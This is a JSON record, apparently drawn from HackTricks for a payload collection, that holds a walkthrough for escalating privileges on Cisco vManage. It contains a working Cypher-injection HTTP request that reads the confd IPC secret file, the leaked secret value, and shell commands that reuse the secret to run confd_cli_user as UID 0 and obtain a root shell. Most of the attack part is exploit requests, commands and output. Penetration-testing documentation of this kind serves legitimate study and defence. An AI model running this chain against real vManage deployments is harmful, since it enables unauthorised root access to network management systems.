{
  "id": "linux_hardening_8037a1c18adb",
  "category": "linux-hardening",
  "title": "cisco vmanage",
  "description": "# Cisco - vmanage\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Path 1\n\n(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))\n\nAfter digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that ",
  "payloads": [
    "# Cisco - vmanage",
    "{{#include ../../banners/hacktricks-training.md}}",
    "## Path 1",
    "(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))",
    "After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:",
    "vmanage:~$ ls -al /etc/confd/confd_ipc_secret",
    "-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret",
    "Remember our Neo4j instance? It is running under the `vmanage` user's privileges, thus allowing us to retrieve the file using the previous vulnerability:",
    "GET /dataservice/group/devices?groupId=test\\\\\\'<>\\\"test\\\\\\\\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\\\"file:///etc/confd/confd_ipc_secret\\\"+AS+n+RETURN+n+//+' HTTP/1.1",
    "Host: vmanage-XXXXXX.viptela.net",
    "\"data\":[{\"n\":[\"3708798204-3215954596-439621029-1529380576\"]}]}",
    "The `confd_cli` program does not support command line arguments but calls `/usr/bin/confd_cli_user` with arguments. So, we could directly call `/usr/bin/confd_cli_user` with our own set of arguments. However it's not readable with our current privileges, so we have to retrieve it from the rootfs and copy it using scp, read the help, and use it to get the shell:",
    "vManage:~$ echo -n \"3708798204-3215954596-439621029-1529380576\" > /tmp/ipc_secret",
    "vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret",
    "vManage:~$ /tmp/confd_cli_user -U 0 -G 0"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/linux-hardening/privilege-escalation/cisco-vmanage.md"
  ]
}